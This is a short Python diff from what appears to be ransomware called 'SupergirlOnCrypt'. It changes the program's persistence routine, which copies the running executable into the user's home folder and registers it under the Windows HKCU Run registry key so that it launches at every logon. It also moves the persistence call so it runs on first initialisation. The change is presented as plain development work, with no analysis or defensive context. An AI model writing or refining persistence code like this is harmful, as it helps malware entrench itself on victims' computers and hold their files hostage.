@@ -33,8 +33,8 @@ def init():
         id = genKeyPair()
         _helper.info('Generating UUID => ' + id)
         _helper.write_file(str(Path.home()) + '/supergirl.uuid', id)
-
-    makePersistence()
+        makePersistence()
+    
     startGui(id)
 
 def startGui(id):
@@ -54,7 +54,7 @@ def makePersistence():
         dest = str(Path.home()) + '/SupergirlOnCrypt'
         if sys.platform == "win32":
             dest = dest + ".exe"
-            dest = dest.replace('\\', '/')
+            dest = dest.replace('/', '\\')
         shutil.copyfile(sys.executable, dest)
         if sys.platform == "win32":
             cmd = 'REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /V "SupergirlOnCrypt" /t REG_SZ /F /D '
